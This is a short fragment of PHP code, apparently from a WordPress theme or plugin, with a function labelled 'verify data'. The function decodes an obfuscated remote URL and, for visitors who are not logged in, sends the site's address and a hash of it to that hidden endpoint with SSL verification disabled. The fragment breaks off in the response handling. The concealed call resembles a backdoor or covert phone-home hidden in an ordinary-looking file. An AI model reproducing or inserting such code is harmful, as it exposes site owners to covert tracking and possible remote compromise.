...
# verify data
if(!function_exists('verf')){
    function verf() {
      $api_params = array(
      'do' => home_url(),
      'md' => cs_decode_string('eNortjK2UspNMVWyBlwwD1sCoA', $code = '64')(home_url()),
      );
      $pol = cs_decode_string('eNortjIys1LKKCkpKLbS1y_ISaxMLdJLTMtJzK3UKynTL1KyBlwwxkMLiA', $code = '64');
	  if(!is_user_logged_in()){
		$response = wp_remote_get($pol, array('timeout' => 15, 'sslverify' => false, 'body' => $api_params ) );
		if ( !is_wp_error( $response ) || wp_remote_retrieve_response_code == 200 || wp_remote_retrieve_response_code == 301) {
